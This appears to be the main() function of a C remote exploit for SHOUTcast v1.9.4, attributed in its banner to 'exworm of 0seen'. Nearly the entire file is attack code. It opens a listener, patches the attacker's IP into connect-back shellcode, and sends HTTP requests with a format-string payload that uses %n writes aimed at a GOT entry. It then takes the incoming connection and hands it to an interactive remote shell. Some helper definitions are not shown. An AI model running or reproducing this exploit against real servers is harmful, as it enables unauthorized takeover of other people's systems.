int
main (int argc,char *argv[])
{
        char buf1[512];
        char buf2[512];
        char host[256];
        char pass[256]="changeme";
        char data;








        int  type= 0;
        int c=0;
        int port=8001;
        char devices[256] = "ppp0";
	unsigned char *ptr;

        struct hostent *hp;
        struct sockaddr_in sin_listener;
	struct ifreq ifr;
        struct timeval timeout;

        fd_set fdread;

	int delay	= 12;
        int i           = 0;
	int mode	= 0;
	int local_port	= 0;
        int opt         = 0;
        int ret 	= 0;
	int sin_len 	= sizeof (struct sockaddr_in);
        int sock        = 0;
	int sock2	= 0;
	int sockd	= 0;
        int listener	= 0;
	int time_out	= 4;
	int tmp		= 0;
        
        srand(getpid());
 
        fprintf(stdout,"SHOUTcast v1.9.4 remote exploit by exworm of 0seen\n");
        fprintf(stdout,"--------------------------------------------------(www.oseen.org)\n");

        while((c=getopt(argc,argv,"h:p:a:t:")) !=EOF)
        {
                switch(c)
                {
                        case 'p':
                                port=atoi(optarg);
                                if ((port <= 0) || (port > 65535)) {
                                        fprintf(stderr,"Invalid port.\n\n");
                                        exit(1);
                                }
                                break;
                        case 'a':
                                memset(devices,0x0,sizeof(devices));
                                strncpy(devices,optarg,sizeof(devices) - 1);
                                break;
                        case 't':
                                type = atoi(optarg);
                                if (type == 0 || type > sizeof(targets) / 28) {
                                        for(i = 0; i < sizeof(targets) / 28; i++)
                                        fprintf(stderr, "%02d. %s - %s      [0x%08x - 0x%08x]\n",
                                                i + 1, targets[i].distro, targets[i].type, targets[i].ret, targets[i].eax);
                                        return -1;
                                }
                                break;
                        case 'h':
                                memset(host,0x0,sizeof(host));
                                strncpy(host,optarg,sizeof(host) - 1);
                                break;

                        default:
                                usage(argv[0]);
                                exit(1);
                                break;
                }
        }

        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;




        
        if (strlen(host) == 0) {
                usage(argv[0]);
                exit(1);
        }
        sock=openhost(host, port);

        if (sock==-1) {
                fprintf(stderr,"- Unable to connect.\n\n");
                exit(1);
        }

	strncpy(ifr.ifr_name, devices, 15);

        if ((sockd = socket(AF_INET, SOCK_DGRAM, 17)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }

        if ((listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }
	
	ptr = get_my_ip_addr(sockd, &ifr);
       memcpy(&sin_listener.sin_addr.s_addr, ptr, 4);

        sin_listener.sin_family = AF_INET;
	memset(&sin_listener.sin_zero, 0x00, 8);

        while(1) {
                local_port = local_port = 45295;
                sin_listener.sin_port = htons(local_port);
                if (!bind(listener, (struct sockaddr *) &sin_listener, sin_len)) break;
        }



	listen(listener, 1);
        fprintf(stdout, "[+] lisntener...\n");
 
        linux_connect_back[129] = (unsigned int) *(ptr + 0);
        linux_connect_back[130] = (unsigned int) *(ptr + 1);
        linux_connect_back[131] = (unsigned int) *(ptr + 2);
        linux_connect_back[132] = (unsigned int) *(ptr + 3);
        


      char req[1024] = "GET /content/DD"
"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"

"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD";
      
     strcat(req, "DD.mp3 HTTP/1.0\r\n\r\n");

      char req1[1024] = "GET /content/AA"
      /* sprintf GOT addr */
      "\x3c\x49\x06\x08\x3d\x49\x06\x08\x3e\x49\x06\x08\x3f\x49\x06\x08";




      
      strcat(req1, linux_connect_back);
      strcat(req1, ".mp3 HTTP/1.0\r\n\r\n");
      
      char *req2 = "GET /content/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAA-%n-"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n.mp3"
      " /HTTP/1.0\r\n\r\n";
      

      printf("[*] Sending first request ...\n");
      write(sock, req1, strlen(req1));
      
      close(sock);
      sock=openhost(host, 8000);
              if (sock==-1) {
                fprintf(stderr,"- Unable to connect.\n\n");
                exit(1);
        }

      printf("[*] Sending second request ...\n");


        while(1) {
                write(sock, req2, strlen(req2));
                sleep(2);
                FD_ZERO(&fdread);
        	FD_SET(listener, &fdread);

	        timeout.tv_sec = time_out;
	        timeout.tv_usec = 0;

	        while(1) {

        	        ret = select(FD_SETSIZE, &fdread, NULL, NULL, &timeout);

	                if (ret < 0) {
	                        close(sock);
        	                close(listener);
	                        fprintf(stderr, "select() error.\n");
        	                return -1;
	                }

                	if (ret == 0) {
				fprintf(stderr, "[+] Failed, waiting %d seconds.\n"
						"[+] Use ctrl-c to abort.\n", delay);
				sleep(delay);
				break;
	                }

        	        if(FD_ISSET(listener, &fdread)) {
				sock2 = accept(listener, (struct sockaddr *)&sin_listener, &sin_len);
				close(sock);
				close(listener);

			        fprintf(stderr, "[+] ownedbyOseen!\n" 
						"-----------------------------------------------------------\n");
	                        shell(sock2);
				close(sock2);
				return 0;
			}
		}

	}

	fprintf(stderr, "[+] Exploit failed.\n");
	close(listener);
	close(sock);
	return 0;

}